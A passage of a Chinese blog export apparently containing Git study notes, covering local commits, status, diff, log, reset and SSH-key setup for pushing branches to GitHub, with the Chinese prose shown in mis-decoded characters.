<p>ç„¶åæˆ‘ä»¬é¦–å…ˆéœ€è¦ä¸€ä¸ªæœ¬åœ°ä»“åº“ï¼Œåœ¨ç”µè„‘åˆé€‚å¤„æ–°å»ºä¸ªæ–‡ä»¶å¤¹ï¼Œä¾‹å¦‚<code>demoRepository</code>ï¼Œç„¶åè¿›å…¥è¯¥æ–‡ä»¶å¤¹ï¼Œå³é”®é¼ æ ‡æ‰“å¼€<code>Git Bash</code>ï¼Œè¾“å…¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¯¥ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€ä¸ªä»¥<code>.git</code>çš„éšè—æ–‡ä»¶å¤¹ï¼Œå°±ä»£è¡¨ç€æˆ‘ä»¬çš„æœ¬åœ°ä»“åº“åˆ›å»ºå¥½äº†ã€‚</p>
<h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><p> <code>Git</code>å¸¸ç”¨çš„æ˜¯ä»¥ä¸‹ 6 ä¸ªå‘½ä»¤ï¼š<code>git clone</code>ã€<code>git push</code>ã€<code>git add</code> ã€<code>git commit</code>ã€<code>git checkout</code>ã€<code>git pull</code> </p>
<p>è¿™å‡ ä¸ªå‘½ä»¤ä½œç”¨å¦‚ä¸‹å›¾æ‰€ç¤º</p>
<p><img src="https://qiniu.yalexin.top/area.png" alt></p>
<p><strong>åè¯è§£é‡Š</strong></p>
<ul>
<li><code>workspace</code>ï¼šå·¥ä½œåŒº</li>
<li><code>staging area</code>ï¼šæš‚å­˜åŒº/ç¼“å­˜åŒº</li>
<li><code>local repository</code>ï¼šç‰ˆæœ¬åº“æˆ–æœ¬åœ°ä»“åº“</li>
<li><code>remote repository</code>ï¼šè¿œç¨‹ä»“åº“</li>
</ul>
<p>æš‚å­˜åŒºå·¥ä½œåŒºåé¢æˆ‘ä»¬ä¼šæ›´åŠ è¯¦ç»†ä»‹ç»</p>
<h3 id="å°†æ–‡ä»¶åŠ åˆ°ä»“åº“ä¸­"><a href="#å°†æ–‡ä»¶åŠ åˆ°ä»“åº“ä¸­" class="headerlink" title="å°†æ–‡ä»¶åŠ åˆ°ä»“åº“ä¸­"></a>å°†æ–‡ä»¶åŠ åˆ°ä»“åº“ä¸­</h3><p>åœ¨æˆ‘ä»¬çš„<code>demoRepository</code>æ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸€ä¸ª<code>README.md</code>æ–‡ä»¶ï¼ˆå®é™…ä¸Šå¦‚æœä½ è¦ä½¿ç”¨<code>Git</code>ç®¡ç†æˆ‘ä»¬çš„æ–‡ä»¶ï¼Œåˆ™éœ€è¦å°†æ–‡ä»¶æ”¾åœ¨ä»“åº“çš„ç›®å½•ä¸‹ï¼‰ï¼Œç„¶ååœ¨é‡Œè¾¹å†™å…¥ä¸€äº›å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">V1: This is a file!</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†è¯¥ä¿®æ”¹æ”¾åˆ°æš‚å­˜åŒºï¼Œå³</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add README.md</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œä¸Šé¢çš„å‘½ä»¤ï¼Œæ²¡æœ‰ä»»ä½•æ˜¾ç¤º</p>
<p>ç„¶åä½¿ç”¨<code>commit</code>å‘½ä»¤å°†å…¶åŠ è‡³ä»“åº“ä¸­</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git commit -m "first commit"</span><br><span class="line">[master (root-commit) bbe2a77] first commit</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 README.md</span><br></pre></td></tr></table></figure>

<p><code>-m</code> å‚æ•°æ˜¯åŠ å…¥æœ¬æ¬¡æäº¤çš„è¯´æ˜å¤‡æ³¨ï¼Œæœ€å¥½æ˜¯å¸¦æœ‰ä¸€å®šç›®çš„æ€§ï¼Œå¦åˆ™åé¢å¾ˆå¤šæäº¤åä½ å°±å¿˜è®°æœ¬æ¬¡æäº¤çš„ç›®çš„äº†ã€‚</p>
<p>ä¸Šé¢çš„å›æ˜¾è¡¨æ˜æœ‰ä¸€ä¸ªæ–‡ä»¶æœ‰æ”¹åŠ¨ï¼Œæœ‰ä¸€è¡Œæ’å…¥ã€‚</p>
<p>å…¶ä»–ä¸€äº›å¸¸ç”¨å‘½ä»¤å¤§å…¨</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>ä½œç”¨</th>
<th>å‘½ä»¤</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>git init</td>
<td>åˆå§‹åŒ–æœ¬åœ°ä»“åº“</td>
<td>git clone</td>
<td>å…‹éš†ä»“åº“ï¼Œå³å°†è¿œç«¯ä»“åº“ä¸‹è½½åˆ°æœ¬åœ°</td>
</tr>
<tr>
<td>git status</td>
<td>æŸ¥çœ‹ä»“åº“å½“å‰çš„çŠ¶æ€</td>
<td>git diff</td>
<td>æ¯”è¾ƒæš‚å­˜åŒºå’Œå·¥ä½œåŒºçš„å·®å¼‚ã€‚</td>
</tr>
<tr>
<td>git add</td>
<td>æ·»åŠ æ–‡ä»¶åˆ°æš‚å­˜åŒº</td>
<td>git commit</td>
<td>æäº¤æš‚å­˜åŒºåˆ°æœ¬åœ°ä»“åº“</td>
</tr>
<tr>
<td>git reset</td>
<td>å›é€€ç‰ˆæœ¬</td>
<td>git rm</td>
<td>åˆ é™¤å·¥ä½œåŒºæ–‡ä»¶</td>
</tr>
<tr>
<td>git mv</td>
<td>ç§»åŠ¨æˆ–é‡å‘½åå·¥ä½œåŒºæ–‡ä»¶</td>
<td>git log</td>
<td>æŸ¥çœ‹å†å²æäº¤è®°å½•</td>
</tr>
<tr>
<td>git blame</td>
<td>ä»¥åˆ—è¡¨å½¢å¼æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çš„å†å²ä¿®æ”¹è®°å½•</td>
<td>git remote</td>
<td>è¿œç¨‹ä»“åº“æ“ä½œ</td>
</tr>
<tr>
<td>git fetch</td>
<td>ä»è¿œç¨‹è·å–ä»£ç åº“</td>
<td>git pull</td>
<td>ä¸‹è½½è¿œç¨‹ä»£ç å¹¶åˆå¹¶</td>
</tr>
<tr>
<td>git push</td>
<td>ä¸Šä¼ è¿œç¨‹ä»£ç å¹¶åˆå¹¶</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="ç‰ˆæœ¬æ§åˆ¶"><a href="#ç‰ˆæœ¬æ§åˆ¶" class="headerlink" title="ç‰ˆæœ¬æ§åˆ¶"></a>ç‰ˆæœ¬æ§åˆ¶</h2><p>ä¸Šé¢æ˜¯ä¸€ä¸ªå°†æ–‡ä»¶åŠ å…¥åˆ°ä»“åº“ä¸­ç®€å•çš„æ­¥éª¤ï¼Œä¸‹é¢æˆ‘ä»¬è¿›è¡Œæ›´åŠ è¯¦ç»†çš„æ­¥éª¤</p>
<p>æˆ‘ä»¬å†åœ¨<code>README.md</code>æ–‡ä»¶ä¸­åŠ å…¥æ–°å†…å®¹(å¢åŠ ä¸€è¡Œ)ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">V2ï¼šThis is the second write</span><br></pre></td></tr></table></figure>

<p>è¾“å…¥å‘½ä»¤<code>git staatus</code>æŸ¥çœ‹å½“å‰ä»“åº“çŠ¶æ€</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git restore &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line">        modified:   README.md</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br></pre></td></tr></table></figure>

<p>å¤§æ¦‚æ„æ€æ˜¯è¯´æœ‰ä¸ªæ–‡ä»¶ä¿®æ”¹è¿‡äº†ã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨<code>diff</code>å‘½ä»¤æŸ¥çœ‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git diff README.md</span><br><span class="line">diff --git a/README.md b/README.md</span><br><span class="line">index 28b620b..48f320f 100644</span><br><span class="line">--- a/README.md</span><br><span class="line">+++ b/README.md</span><br><span class="line">@@ -1 +1,3 @@</span><br><span class="line">-V1: This is a file!</span><br><span class="line">\ No newline at end of file</span><br><span class="line">+V1: This is a file!</span><br><span class="line">+</span><br><span class="line">+V2ï¼šThis is the second write</span><br><span class="line">\ No newline at end of file</span><br></pre></td></tr></table></figure>

<p>è¯¥å‘½ä»¤å¯ä»¥æ›´åŠ æ¸…æ™°åœ°çŸ¥é“æ”¹åŠ¨äº†å“ªé‡Œã€‚</p>
<p>ç„¶åæˆ‘ä»¬å°†å®ƒä»¬åŠ åˆ°ä»“åº“ä¸­ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git add .</span><br><span class="line"></span><br><span class="line">E:\MyBlog\demoRepository&gt;git commit -m "second commit"</span><br><span class="line">[master e54198e] second commit</span><br><span class="line"> 1 file changed, 3 insertions(+), 1 deletion(-)</span><br><span class="line"></span><br><span class="line">E:\MyBlog\demoRepository&gt;git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<h3 id="åˆ‡æ¢åˆ°æŒ‡å®šç‰ˆæœ¬"><a href="#åˆ‡æ¢åˆ°æŒ‡å®šç‰ˆæœ¬" class="headerlink" title="åˆ‡æ¢åˆ°æŒ‡å®šç‰ˆæœ¬"></a>åˆ‡æ¢åˆ°æŒ‡å®šç‰ˆæœ¬</h3><p>æˆ‘çªç„¶å‘ç°ï¼Œæˆ‘çš„æ–‡ä»¶é‡Œè¾¹å†™é”™äº†ä¸ªå•è¯<code>write</code>ï¼Œåº”è¯¥æ˜¯<code>writing</code>ï¼Œå½“ç„¶ä½ å¯ä»¥ç›´æ¥ä»æ–‡ä»¶ä¸‹æ‰‹ï¼Œç›´æ¥ä¿®æ”¹æºæ–‡ä»¶ï¼Œå¯æ˜¯ç°åœ¨æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå½“ç„¶çŸ¥é“è¦æ€ä¹ˆæ”¹ï¼Œæœ‰çš„æ—¶å€™æˆ‘ä»¬å¯èƒ½éœ€è¦çš„æ˜¯è¿”å›åˆ°ä¸Šä¸€æ¬¡å‰¯æœ¬çŠ¶æ€ï¼Œå³æˆ‘ä»¬çš„<code>V1</code>ç‰ˆæœ¬ï¼Œåˆ™è¯¥å¦‚ä½•ï¼Ÿ</p>
<p>æˆ‘ä»¬å¯ä»¥å€ŸåŠ©<code>git log</code>å‘½ä»¤æŸ¥çœ‹æäº¤è®°å½•ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git log</span><br><span class="line">commit e54198ebb4e69baf5ea92eb75546b1dede044c52 (HEAD -&gt; master)</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Tue Feb 8 20:07:55 2022 +0800</span><br><span class="line"></span><br><span class="line">    second commit</span><br><span class="line"></span><br><span class="line">commit bbe2a77f4df4b447e42b53c81f02eb2e07c8c774</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Tue Feb 8 18:20:39 2022 +0800</span><br><span class="line"></span><br><span class="line">    first commit</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æ¯ä¸€æ¬¡çš„<code>commit</code>éƒ½å¯¹åº”ä¸€ä¸ªå“ˆå¸Œå€¼ã€‚æˆ‘ä»¬è¿˜å‘ç°æœ€æ–°çš„ç‰ˆæœ¬æ—è¾¹è¿˜åŠ äº†ä¸€ä¸ª<code>HEAD</code>,è¡¨æ˜è¿™ä¸ªæ˜¯å½“å‰ç‰ˆæœ¬ï¼Œä¸Šä¸€ä¸ªç‰ˆæœ¬æ˜¯<code>HEAD^</code>ï¼Œä¸Šä¸Šä¸ªç‰ˆæœ¬æ˜¯<code>HEAD^^</code>ï¼Œå¾€ä¸Š91ä¸ªç‰ˆæœ¬å‘¢ï¼Œæ€»ä¸å¯èƒ½91ä¸ª<code>^</code>å§ï¼Œ<code>Git</code>æ—©å°±ä¸ºä½ æƒ³å¥½å•¦ï¼ç”¨<code>HEAD~91</code>å³å¯ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨<code>reset</code>å‘½ä»¤å³å¯å®ç°å»åˆ°æŸä¸ªç‰ˆæœ¬</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^</span></span><br><span class="line">HEAD is now at bbe2a77 first commit</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨æ‰“å¼€æˆ‘ä»¬çš„<code>README.md</code>æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æœç„¶å˜æˆäº†ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œç†è®ºä¸Šè¯´ï¼Œåªè¦æˆ‘ä»¬è®°å¾—æ¯ä¸€æ¬¡<code>commit</code>å¯¹åº”çš„å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ä»»æ„ç‰ˆæœ¬ä¹‹é—´è½¬æ¢ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬ä¹‹å‰ç¬¬äºŒæ¬¡çš„ç‰ˆæœ¬æ˜¯<code>second commit</code>ï¼Œå¯¹åº”çš„å“ˆå¸Œå€¼æ˜¯<code>e54198ebb4e69baf5ea92eb75546b1dede044c52</code></p>
<blockquote>
<p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç‰ˆæœ¬å›é€€ä»¥åï¼Œæ¯”å½“å‰ç‰ˆæœ¬â€œæ–°â€çš„æäº¤è®°å½•æ˜¯æ— æ³•çœ‹å¾—åˆ°çš„ï¼Œå³æ­¤æ—¶å¦‚æœä½¿ç”¨<code>git log</code>å‘½ä»¤æ—¶æˆ‘ä»¬ä¼šå‘ç°åªæœ‰ç¬¬ä¸€æ¬¡çš„æäº¤è®°å½•äº†</p>
</blockquote>
<p>æˆ‘ä»¬ç»§ç»­ä½¿ç”¨<code>reset</code>å‘½ä»¤è¿›è¡Œç‰ˆæœ¬åˆ‡æ¢ï¼Œä¾‹å¦‚åˆ‡æ¢åˆ°ç¬¬äºŒæ¬¡æäº¤çŠ¶æ€ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard e54198ebb4e69baf5ea92eb75546b1dede044c52</span></span><br><span class="line">HEAD is now at e54198e second commit</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨æ‰“å¼€æˆ‘ä»¬çš„<code>README.md</code>æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æœç„¶å˜å›äº†ä¸¤è¡Œå†…å®¹ã€‚</p>
<p><strong>æˆ‘çªç„¶å‘ç°æˆ‘æƒ³å›é€€ç‰ˆæœ¬ä¸å°±æ˜¯ä¸ºäº†æ”¹å•è¯å—ï¼Œå¯æ˜¯æ€ä¹ˆåˆè·³å›æ¥äº†ï¼Ÿï¼Ÿç®—äº†ç®—äº†ï¼Œç›´æ¥ä¿®æ”¹æ–‡ä»¶å§ï¼Œåˆä¸æ˜¯ä¸èƒ½ï¼</strong></p>
<p>å°†ç¬¬äºŒè¡Œæ”¹æˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">V3ï¼šThis is the third writing</span><br></pre></td></tr></table></figure>

<p>é¡ºä¾¿æŠŠä¿®æ”¹åçš„æ–‡ä»¶åŠ åˆ°ä»“åº“ä¸­</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m "3"</span><br></pre></td></tr></table></figure>

<p><code>add .</code>æ˜¯å°†å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„ä¿®æ”¹éƒ½åŠ  åˆ°æš‚å­˜åŒºã€‚</p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>å­¦ä¹ </tag>
        <tag>å‘½ä»¤è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitå­¦ä¹ ç¬”è®°ä¹‹å¤šäººåä½œ</title>
    <url>/2022/02/10/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A4%9A%E4%BA%BA%E5%8D%8F%E4%BD%9C/</url>
    <content><![CDATA[<p>ä¹¦æ¥ä¸Šå›ï¼Œæœ¬æ–‡ä»‹ç»åˆ©ç”¨<code>Git</code>è¿›è¡Œå¤šäººåä½œã€‚</p>
<a id="more"></a>

<p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ<code>Git</code>æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç®¡ç†è½¯ä»¶ï¼Œä½•ä¸ºåˆ†å¸ƒå¼ï¼Ÿç®€å•æ¥è¯´ä»£ç ä»“åº“åœ¨å¤šå°ä¸»æœºä¸Šéƒ½æœ‰å¤‡ä»½ï¼Œä»»æ„ä¸€å°æŒ‚äº†ä¹Ÿä¸è‡³äºä»£ç ä¸¢å¤±ï¼ˆå½“ç„¶æ‰€æœ‰å…³è”äº†è¯¥ä»“åº“çš„ä¸»æœºéƒ½æŒ‚äº†çš„æ—¶å€™å¦å½“åˆ«è®ºï¼‰ã€‚</p>
<p>æˆ‘ä»¬æ‰€è¯´çš„å¤šäººåä½œå°±æ˜¯æ¯ä¸ªäººåœ¨è‡ªå·±çš„ç”µè„‘ä¸Šéƒ½æœ‰ä¸­å¤®ä»“åº“ä»£ç çš„ä¸€ä»½å¤‡ä»½ä»£ç ï¼Œé€‚å½“ä¹‹æ—¶å°†æˆ‘ä»¬çš„ä»£ç æ¨é€è‡³ä¸­å¤®ä»“åº“æˆ–è€…æ‹‰å–åˆ«äººå†™çš„ä»£ç ä¸‹æ¥ï¼Œè¿™æ—¶å€™å°±éœ€è¦ä¸€å°ç”µè„‘å……å½“æœåŠ¡å™¨ï¼Œåœ¨ä¸Šé¢è¿è¡Œæˆ‘ä»¬çš„<code>Git</code>ç¨‹åºï¼Œä½†æ˜¯æˆ‘ä»¬å°±åƒç®€ç®€å•å•ä½¿ç”¨ä¸€ä¸‹<code>Git</code>ï¼Œå¹¶ä¸æƒ³æ­å»ºæœåŠ¡å™¨ï¼Œå¯ä»¥å—ï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œæœ‰ä¸å°‘ä¼ä¸šéƒ½æ¨å‡ºäº†ç¬¬ä¸‰æ–¹ä»£ç æ‰˜ç®¡å¹³å°ï¼Œæœ€å‡ºåçš„æ€•ä¸æ˜¯<a href="https://github.com/" target="_blank" rel="noopener"><code>Github</code></a>äº†ï¼Œä¸è¿‡æœ‰ä¸€äº›ç‰¹æ®ŠåŸå› ï¼Œè¯¥ç½‘ç«™å¯èƒ½ä¸ç¨³å®šï¼Œå»ºè®®é…åˆå›½å†…çš„æ‰˜ç®¡å¹³å°ä½¿ç”¨ï¼Œå›½å†…æ¯”è¾ƒçŸ¥åçš„æœ‰<a href="https://gitee.com/" target="_blank" rel="noopener"><code>Gitee</code></a>ã€<a href="https://coding.net/" target="_blank" rel="noopener"><code>CODING</code></a>ï¼Œå¦å¤–ï¼Œ<code>github</code>é»˜è®¤æ‰€æœ‰ä»“åº“éƒ½æ˜¯å…¬å¼€çš„ï¼Œè¦æƒ³å»ºç«‹ç§æœ‰çš„ä»“åº“è¿˜æ˜¯è¦å……å€¼ï¼Œä¸è¿‡è¦æ˜¯æœ‰æ•™è‚²é‚®ç®±å¯ä»¥ä¼˜æƒ ï¼Œè¯¥ç½‘ç«™çš„ç”¨æˆ·ä¹Ÿæ¯”è¾ƒå¤šï¼Œä¸Šé¢çš„é¡¹ç›®è´¨é‡ä¹Ÿæ›´å¥½ã€‚</p>
<h2 id="è¿œç¨‹ä»“åº“çš„ä½¿ç”¨"><a href="#è¿œç¨‹ä»“åº“çš„ä½¿ç”¨" class="headerlink" title="è¿œç¨‹ä»“åº“çš„ä½¿ç”¨"></a>è¿œç¨‹ä»“åº“çš„ä½¿ç”¨</h2><p>ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºå¤šäººåä½œï¼Œä»¥ä½¿ç”¨<code>github</code>ä¸ºä¾‹ï¼Œæœ¬äººä½¿ç”¨çš„ç¬”è®°æœ¬å’ŒæœåŠ¡å™¨ä½œä¸ºä¸¤ä¸ªç”¨æˆ·è¿æ¥åˆ°<code>github</code>ä¸Šé¢çš„ä»“åº“ã€‚</p>
<h3 id="åˆ›å»ºGitHubè´¦æˆ·å¹¶æ–°å»ºä¸€ä¸ªç©ºä»“åº“"><a href="#åˆ›å»ºGitHubè´¦æˆ·å¹¶æ–°å»ºä¸€ä¸ªç©ºä»“åº“" class="headerlink" title="åˆ›å»ºGitHubè´¦æˆ·å¹¶æ–°å»ºä¸€ä¸ªç©ºä»“åº“"></a>åˆ›å»ºGitHubè´¦æˆ·å¹¶æ–°å»ºä¸€ä¸ªç©ºä»“åº“</h3><p>æ³¨å†Œè´¦å·å°±ä¸ç”¨å¤šè¯´äº†å§ã€‚</p>
<p>ç„¶åç‚¹å‡»å³ä¸Šè§’çš„åŠ å·ï¼Œç‚¹å‡»â€new repositoryâ€ï¼Œè¾“å…¥åå­—â€œcooperationâ€ï¼Œç„¶åç‚¹å‡»â€œCreate repositoryâ€ã€‚</p>
<h3 id="å…³è”SSH-Key-åˆ°GitHub"><a href="#å…³è”SSH-Key-åˆ°GitHub" class="headerlink" title="å…³è”SSH Key åˆ°GitHub"></a>å…³è”SSH Key åˆ°GitHub</h3><p>åœ¨Windowsç³»ç»Ÿä¸Šé¢ï¼Œé¦–å…ˆåˆ›å»º<code>SSH Key</code>ï¼Œæ‰“å¼€å‘½ä»¤æç¤ºç¬¦çª—å£æˆ–è€…<code>Git bash</code></p>
<p>è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "495592364@qq.com"</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŒ‰ä¸‹ä¸‰æ¬¡å›è½¦å³å¯ç”Ÿæˆã€‚</p>
<p><img src="https://qiniu.yalexin.top/cooperation1.jpg" alt></p>
<p>è®°å¾—æŠŠé‚®ç®±æ¢æˆä½ çš„ï¼Œç„¶åæ‰“å¼€<code>C:\Users\YaleXin\.ssh</code>ï¼Œå³ä½ çš„ç”¨æˆ·åä¸‹çš„<code>.ssh</code>æ–‡ä»¶å¤¹ï¼Œ é‡Œè¾¹æœ‰<code>id_rsa</code>å’Œ<code>id_rsa.pub</code>è¿™ä¸¤ä¸ªæ–‡ä»¶ ï¼Œ è¿™ä¸¤ä¸ªå°±æ˜¯<code>SSH Key</code>çš„ç§˜é’¥å¯¹ï¼Œ<code>id_rsa</code>æ˜¯ç§é’¥ï¼Œåƒä¸‡ä¸èƒ½æ³„éœ²å‡ºå»ï¼Œ<code>id_rsa.pub</code>æ˜¯å…¬é’¥ï¼Œå¯ä»¥æ”¾å¿ƒåœ°å‘Šè¯‰ä»»ä½•äººã€‚</p>
<p>ç„¶åæ‰“å¼€<code>id_rsa.pub</code>ï¼Œå°†é‡Œè¾¹çš„å†…å®¹å¤åˆ¶ï¼Œæ¥ç€æ‰“å¼€<code>GitHub</code>ç½‘ç«™ï¼Œä¾æ¬¡ç‚¹å‡»ä½ çš„å¤´åƒï¼Œâ€œsettingâ€ï¼Œâ€œSSH and GPG keysâ€ï¼Œç„¶åå°†åˆšåˆšå¤åˆ¶çš„å†…å®¹â€œ Key â€ä¸­ï¼Œèµ·ä¸€ä¸ªå¥½ä¸€ç‚¹çš„â€œtitleâ€ã€‚</p>
<p>è¿™æ ·å­<code>Windows</code>ç³»ç»Ÿä»¥åå°±å¯ä»¥å…³è”<code>GitHub</code>äº†ã€‚</p>
<p>åŒæ ·çš„æ–¹æ³•åœ¨æœåŠ¡å™¨ä¸Šé¢å†æ¬¡æ“ä½œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "me@yalexin.top"</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ³¨æ„å…¬é’¥ç”Ÿæˆçš„ä½ç½®å³å¯ã€‚</p>
<p>ç„¶åå°†å…¬é’¥å†…å®¹åŠ åˆ°<code>GitHub</code>ã€‚</p>
<h3 id="æœ¬åœ°ä»“åº“å…³è”GitHubä»“åº“"><a href="#æœ¬åœ°ä»“åº“å…³è”GitHubä»“åº“" class="headerlink" title="æœ¬åœ°ä»“åº“å…³è”GitHubä»“åº“"></a>æœ¬åœ°ä»“åº“å…³è”GitHubä»“åº“</h3><p>Windowsç³»ç»Ÿä¸Šé¢ï¼Œæ‰“å¼€å‘½ä»¤æç¤ºç¬¦çª—å£æˆ–è€…<code>Git bash</code>ï¼Œåˆå§‹åŒ–æœ¬åœ°ä»“åº“</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir cooperation</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> cooperation</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br><span class="line">Initialized empty Git repository in E:/MyBlog/cooperation/.git/</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¼€å§‹å¹²æ´»å•¦ï¼Œä¸»åˆ†æ”¯æ·»åŠ <code>readme</code>æ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> touch README.md</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"åˆ›å»ºä»“åº“"</span></span></span><br><span class="line">[master (root-commit) 3469c3f] åˆ›å»ºä»“åº“</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 README.md</span><br></pre></td></tr></table></figure>

<p>å…³è”è¿œç¨‹ä»“åº“</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add origin https://github.com/YaleXin/cooperation.git</span><br></pre></td></tr></table></figure>

<p><code>https://github.com/YaleXin/cooperation.git</code>è¿™ä¸ªåœ°å€åœ¨<code>GitHub</code>ä»“åº“ç•Œé¢è·å¾—ã€‚</p>
<p>æ·»åŠ åï¼Œè¿œç¨‹ä»“åº“çš„åå­—å°±æ˜¯<code>origin</code>ï¼Œå½“ç„¶äº†ï¼Œè¿™æ˜¯<code>Git</code>é»˜è®¤çš„å«æ³•ï¼Œä½ è¦æ˜¯å–œæ¬¢ä¹Ÿå¯ä»¥æ”¹æˆåˆ«çš„ï¼Œä½†æ˜¯æœ€å¥½è§åæ€æ„ï¼Œ<code>origin</code>è¿™ä¸ªåå­—ä¸€çœ‹å°±çŸ¥é“æ˜¯è¿œç¨‹åº“ã€‚</p>
<p>ä¸‹ä¸€æ­¥ï¼Œå°±å¯ä»¥æŠŠæœ¬åœ°åº“çš„æ‰€æœ‰å†…å®¹æ¨é€åˆ°è¿œç¨‹åº“ä¸Šï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br></pre></td></tr></table></figure>

<p>ç”±äºè¿™æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ¬¡å‘è¿œç«¯ä»“åº“æ¨é€ï¼Œå³è¿œç«¯ä»“åº“è¿˜æ²¡æœ‰è¯¥åˆ†æ”¯ï¼Œå› æ­¤éœ€è¦åŠ ä¸Š<code>-u</code>å‚æ•°ï¼Œä¸‹æ¬¡éœ€è¦æ¨é€è¯¥åˆ†æ”¯çš„æ—¶å€™ç›´æ¥<code>git push</code>å³å¯ã€‚</p>
<p>åˆ›å»ºæœ¬äººçš„åˆ†æ”¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c dev</span></span><br><span class="line">Switched to a new branch 'dev'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch -c Axin</span></span><br><span class="line">Switched to a new branch 'Axin'</span><br><span class="line"><span class="meta">$</span><span class="bash"> touch xin.data</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"æ·»åŠ ç”¨æˆ·ä¿¡æ¯"</span></span></span><br><span class="line">[Axin 64f3345] æ·»åŠ ç”¨æˆ·ä¿¡æ¯</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 xin.data</span><br></pre></td></tr></table></figure>

<p>åˆå¹¶åˆ°<code>dev</code>åˆ†æ”¯</p>
